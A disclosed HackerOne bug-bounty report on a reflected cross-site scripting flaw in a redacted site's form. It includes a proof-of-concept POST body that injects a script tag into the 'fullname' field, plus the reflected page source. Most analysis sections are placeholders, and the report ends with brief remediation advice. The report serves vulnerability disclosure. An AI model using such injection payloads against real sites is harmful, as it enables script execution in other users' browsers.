# reflected xss @ www.█████████

## Metadata
- **Source:** HackerOne
- **Report:** 225020 | https://hackerone.com/reports/225020
- **Submitted:** 2017-04-29
- **Reporter:** geeknik
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
**Summary:**
https://www.██████████/█████████is vulnerable to cross site scripting attacks.

**PoC**

Sending the following `POST` request to `/█████` triggers the xss:
```
%3d=%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3dTOP_OF_RECORD%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d&ATprogram=1&E=&fullname=nbfgkjaa'%22()%26%25<geeknik>

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**
https://www.██████████/█████████is vulnerable to cross site scripting attacks.

**PoC**

Sending the following `POST` request to `/█████` triggers the xss:
```
%3d=%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3dTOP_OF_RECORD%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d&ATprogram=1&E=&fullname=nbfgkjaa'%22()%26%25<geeknik><ScRiPt%20>prompt(/XSS/)</ScRiPt>&glomf=1&glorf=1&numusers=xmkucffw&org=1&other=1&phone=555-666-0606&recType%21=-██████-&source=1&sponsorglomf=1&sponsorname=xmkucffw&sponsorphone=555-666-0606
```

This is reflected in the page source:
```
A request has successfully been entered for nbfgkjaa'"()&%<geeknik><ScRiPt >prompt(/XSS/)</ScRiPt>.</h3><h3>A confirmation email will shortly be sent to 1.</h3>
```

**Suggested Mitigation/Remediation Actions**
This script should filter metacharacters from user input.



</details>

---
*Analysed by Claude on 2026-05-24*
